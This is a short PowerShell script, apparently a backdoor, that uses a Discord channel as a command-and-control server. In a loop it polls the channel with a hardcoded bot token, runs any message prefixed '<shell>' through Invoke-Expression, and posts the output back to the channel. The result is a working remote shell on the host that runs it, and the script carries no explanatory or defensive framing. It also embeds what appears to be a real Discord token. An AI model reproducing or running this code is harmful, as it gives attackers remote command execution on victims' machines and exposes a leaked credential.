$url = "https://discord.com/api/v9/channels/1210194870850031656/messages"
$discordToken = "MTE5ODY3Njc4NTg5MDYwNzE3Nw.GnqMWY.3rwKiCVRerCjS_meDerhJDfubEZWbrwbrsYA_k"

$headers = @{
    Authorization = $discordToken
}

while ($true) {
    Start-Sleep -Seconds 5

    $response = Invoke-WebRequest -Uri ($url + "?limit=1") -Headers $headers

    if ($response.StatusCode -eq 200) {
        $messageData = $response.Content | ConvertFrom-Json

        if ($messageData[0].content -like "<shell>*") {
            $shellCommand = $messageData[0].content.Substring(7)
            
            Try {
                $result = Invoke-Expression $shellCommand 2>&1 | Out-String;

                $body = @{
                    "content" = $result
                }
        
                $bodyJson = $body | ConvertTo-Json
                Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"

            } catch {
                $body = @{
                    "content" = "ERROR"
                }
        
                $bodyJson = $body | ConvertTo-Json
                Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"
            }
        }
    }
}
